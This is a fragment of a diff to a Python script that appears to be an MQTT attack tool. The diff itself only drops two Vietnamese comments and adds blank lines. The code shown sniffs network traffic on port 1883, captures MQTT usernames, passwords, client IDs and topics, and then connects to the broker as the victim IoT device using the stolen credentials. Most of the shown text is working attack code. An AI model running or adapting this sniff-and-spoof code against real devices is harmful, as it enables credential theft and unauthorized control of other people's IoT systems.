@@ -75,7 +75,7 @@ def All(ip, port, interface):
             return 'Username' in temp_info and 'Password' in temp_info and 'Client_Id' in temp_info and 'Topic' in temp_info1
         sniff(iface=interface, filter="tcp port 1883",
             prn=decode_mqtt_raw, lfilter=filter_mqtt, stop_filter=stop_sniffing, count=1000)#count=2
-        # Hàm giả mạo thiết bị IOT tại đây
+        
         def spoofingIOT(Client_Id,Username, Password, Topic):
             client = mqtt.Client(Client_Id)
             def on_connect(client, userdata, flags, rc):
@@ -92,11 +92,10 @@ def All(ip, port, interface):
             client.username_pw_set(Username, Password)  # Thiết lập thông tin đăng nhập
             client.connect(ip, port)  # Kết nối tới broker MQTT
             client.loop_forever()
-
-           #Khi có đầy đủ các tham số mới bắt đầu chạy 
         if(temp_info1.get('Topic') and temp_info.get('Username') and temp_info.get('Password') and temp_info.get('Client_Id')):
             spoofingIOT(temp_info['Client_Id'],temp_info['Username'],
                         temp_info['Password'], temp_info1['Topic'])
+            
     except:
         print("Error Input !!!!!!!")
         sys.stdout.flush()
